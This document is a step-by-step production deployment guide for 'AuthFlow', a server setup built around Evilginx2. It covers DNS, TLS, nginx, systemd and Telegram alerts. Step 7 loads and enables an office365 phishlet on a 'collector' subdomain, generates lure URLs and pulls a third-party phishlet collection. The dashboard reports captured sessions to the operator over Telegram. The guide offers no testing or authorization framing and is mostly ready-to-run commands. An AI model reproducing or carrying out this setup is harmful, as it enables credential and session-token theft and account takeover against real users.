# AuthFlow Production Deployment Guide

## Overview

This guide walks through deploying AuthFlow on Ubuntu with:
- Deterministic package versions
- Non-interactive installation
- Cloudflare DNS + TLS automation
- nginx reverse proxy with security hardening
- Evilginx2 integration
- systemd service management
- Automatic certificate renewal

---

## Prerequisites

### System Requirements
- **OS**: Ubuntu 22.04 LTS (Jammy) or 24.04 LTS (Noble)
- **RAM**: Minimum 2GB (4GB recommended)
- **Disk**: Minimum 20GB (50GB recommended for data)
- **CPU**: 2 cores minimum
- **Network**: Public IP with root access

### Credentials Required
Before starting, gather:
1. **Domain**: Your primary domain (e.g., `example.com`)
2. **VPS IP**: Your server's public IPv4 address
3. **Cloudflare API Token**: Full-zone edit token from Cloudflare dashboard
4. **Telegram Bot Token**: From BotFather (`bot_token`)
5. **Telegram Chat ID**: Your personal chat ID for receiving alerts

---

## Step 1: Prepare the Server

### 1.1 Initial Setup
```bash
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install -y byobu git curl wget

# Optional: Enable byobu for persistent sessions
sudo byobu-enable
```

### 1.2 Clone AuthFlow Repository
```bash
git clone https://github.com/tartmo/authflow.git ~/authflow
cd ~/authflow
chmod +x scripts/install-prod.sh
```

---

## Step 2: Prepare Cloudflare

### 2.1 Create Cloudflare API Token
1. Log into [Cloudflare Dashboard](https://dash.cloudflare.com/)
2. Go to **Profile > API Tokens**
3. Click **Create Token**
4. Choose **Edit zone DNS** template
5. Set permissions:
   - Zone → DNS → Edit
   - Zone → Zone → Read
6. Set zone resources to your domain
7. Copy the generated token (you'll use this once)

### 2.2 Configure Domain DNS
Point your domain's nameservers to Cloudflare:
1. In Cloudflare, find your domain's nameservers
2. Update your registrar's nameserver settings
3. Wait for DNS propagation (up to 48 hours, typically 5-30 minutes)

---

## Step 3: Create Telegram Bot

### 3.1 Create Bot with BotFather
```bash
# In Telegram, find @BotFather
/start
/newbot
# Follow prompts, receive bot_token (e.g., 123456:ABCDEFghijklmn)
```

### 3.2 Get Your Chat ID
```bash
# Send a message to your new bot
# Then visit this URL in your browser (replace TOKEN)
https://api.telegram.org/botTOKEN/getUpdates

# Look for "from" → "id" field
# That's your TELEGRAM_CHAT_ID
```

---

## Step 4: Run Production Installer

### 4.1 Using Environment Variables (Recommended)
```bash
cd ~/authflow

sudo DOMAIN=example.com \
     VPS_IP=203.0.113.42 \
     TELEGRAM_TOKEN=123456:ABCDEFghijklmn \
     TELEGRAM_CHAT=9876543210 \
     CLOUDFLARE_TOKEN=cfut_xxxxxxxxxxxxxxxxxxx \
     ADMIN_PASS=YourSecurePassword123 \
     ./scripts/install-prod.sh
```

### 4.2 Using CLI Flags
```bash
sudo ./scripts/install-prod.sh \
  --domain example.com \
  --vps-ip 203.0.113.42 \
  --telegram-token 123456:ABCDEFghijklmn \
  --telegram-chat 9876543210 \
  --cloudflare-token cfut_xxxxxxxxxxxxxxxxxxx \
  --admin-pass YourSecurePassword123
```

### 4.3 What the Installer Does
1. ✅ Validates prerequisites
2. ✅ Installs pinned dependency versions
3. ✅ Sets up Cloudflare DNS credentials
4. ✅ Clones and builds Evilginx2
5. ✅ Deploys AuthFlow source code
6. ✅ Builds Go binary with optimizations
7. ✅ Creates configuration file
8. ✅ Provisions TLS certificates via Cloudflare DNS
9. ✅ Configures nginx reverse proxy
10. ✅ Sets up systemd service
11. ✅ Starts AuthFlow service

---

## Step 5: Verify Installation

### 5.1 Check Service Status
```bash
# Check if running
sudo systemctl status authflow

# View recent logs
sudo journalctl -u authflow -n 50

# Follow live logs
sudo journalctl -u authflow -f
```

### 5.2 Check nginx
```bash
# Verify nginx config
sudo nginx -t

# Check nginx status
sudo systemctl status nginx

# View nginx logs
sudo tail -f /var/log/nginx/authflow_access.log
sudo tail -f /var/log/nginx/authflow_error.log
```

### 5.3 Test TLS Certificates
```bash
# Check certificate details
sudo certbot certificates

# Verify certificate in browser
# Visit: https://example.com/ADMIN_PATH
# (replace ADMIN_PATH with your actual path)
```

### 5.4 Check Evilginx2
```bash
# Verify binary installed
which evilginx

# Check version
evilginx -version

# Phishlets directory
ls -la /opt/evilginx2/phishlets/
```

---

## Step 6: Initial Configuration

### 6.1 Access Dashboard
```
URL: https://example.com/ADMIN_PATH
Username: admin
Password: (your ADMIN_PASS)
```

### 6.2 Configure Portal Endpoints
The installer creates three portal subdomains:
- `collector-XXXX.example.com`
- `tracker-XXXX.example.com`
- `monitor-XXXX.example.com`

These are ready to use immediately.

### 6.3 Telegram Integration
AuthFlow will send alerts to your Telegram bot when:
- New sessions are captured
- Configuration changes occur
- Errors or warnings happen

---

## Step 7: Deploy Phishlets (Evilginx2)

### 7.1 Access Evilginx2
```bash
# Run interactively (development only)
sudo evilginx -p /opt/evilginx2/phishlets

# In the Evilginx console:
phishlets load office365
phishlets enable office365
domains add office365 collector-XXXX.example.com
lures create office365
lures get-url 0
```

### 7.2 Download Pre-built Phishlets
```bash
cd /opt/evilginx2/phishlets

# Download popular phishlets
git clone https://github.com/fin1te/evilginx2-phishlets.git
cp evilginx2-phishlets/*.yaml ./
```

---

## Ongoing Operations

### Certificate Renewal
Automatic renewal is configured via systemd timer:
```bash
# Check renewal status
sudo certbot renew --dry-run

# Manual renewal if needed
sudo certbot renew --force-renewal
```

### Service Management
```bash
# Restart service
sudo systemctl restart authflow

# Stop service
sudo systemctl stop authflow

# View service status
sudo systemctl status authflow

# Check startup logs
sudo systemctl show authflow -p ExecMainStartTimestamp -p ExecMainPID
```

### Monitor Performance
```bash
# Real-time service monitoring
sudo journalctl -u authflow -f

# Check resource usage
sudo ps aux | grep authflow

# Monitor network connections
sudo netstat -tunap | grep authflow

# View nginx traffic
sudo tail -f /var/log/nginx/authflow_access.log
```

### Update AuthFlow
```bash
cd ~/authflow
git pull origin main

# Rebuild binary
cd /opt/authflow
go build -o authflow-server

# Restart service
sudo systemctl restart authflow
```

---

## Security Best Practices

### 1. Firewall Configuration
```bash
# Allow SSH
sudo ufw allow 22/tcp

# Allow HTTP/HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Restrict admin access (optional)
sudo ufw allow from YOUR_IP to any port 8080

# Enable firewall
sudo ufw enable
```

### 2. Credential Management
- **Never commit credentials to git**
- Store `ADMIN_PASS` securely (password manager)
- Rotate `ADMIN_PATH` periodically
- Restrict `/etc/letsencrypt/cloudflare-token.ini` to root only

### 3. Monitoring
- Monitor `/var/log/nginx/` for suspicious activity
- Check `journalctl` for service errors
- Set up log rotation (handled by logrotate automatically)
- Review captured sessions regularly

### 4. Backups
```bash
# Backup configuration and data
sudo tar -czf /root/authflow-backup-$(date +%Y%m%d).tar.gz \
    /opt/authflow/data \
    /opt/authflow/config.json \
    /etc/letsencrypt/

# Backup to remote (rsync/S3/etc.)
```

---

## Troubleshooting

### Service won't start
```bash
# Check for errors
sudo journalctl -u authflow -n 100

# Verify config JSON is valid
sudo jq . /opt/authflow/config.json

# Check permissions
sudo ls -la /opt/authflow/
```

### Certificate issues
```bash
# Check certificate status
sudo certbot certificates

# Renew manually
sudo certbot renew --force-renewal

# Check Cloudflare credentials
sudo cat /etc/letsencrypt/cloudflare-token.ini
```

### nginx errors
```bash
# Test configuration
sudo nginx -t

# Check nginx logs
sudo tail -f /var/log/nginx/authflow_error.log

# Reload nginx
sudo systemctl reload nginx
```

### Port conflicts
```bash
# Check what's using port 8080
sudo lsof -i :8080

# Check what's using ports 80/443
sudo lsof -i :80
sudo lsof -i :443
```

---

## Uninstallation

To remove AuthFlow completely:
```bash
# Stop service
sudo systemctl stop authflow

# Remove service
sudo systemctl disable authflow
sudo rm /etc/systemd/system/authflow.service

# Remove installation
sudo rm -rf /opt/authflow

# Remove nginx site
sudo rm /etc/nginx/sites-available/authflow /etc/nginx/sites-enabled/authflow
sudo systemctl reload nginx

# Remove Evilginx
sudo rm -rf /opt/evilginx2
sudo rm /usr/local/bin/evilginx

# Remove systemd reload
sudo systemctl daemon-reload
```

---

## Support & Documentation

- **GitHub**: https://github.com/tartmo/authflow
- **Issues**: Report bugs at issues page
- **Wiki**: Detailed guides and FAQs
- **Telegram**: Community support group

---

## Version Info

- **AuthFlow Version**: Check in dashboard or `authflow-server -version`
- **Evilginx2**: Latest from official repository
- **Go Version**: 1.22+
- **nginx Version**: 1.24.0+

---

**Last Updated**: May 15, 2026
**Maintained By**: Tartmo Security Team
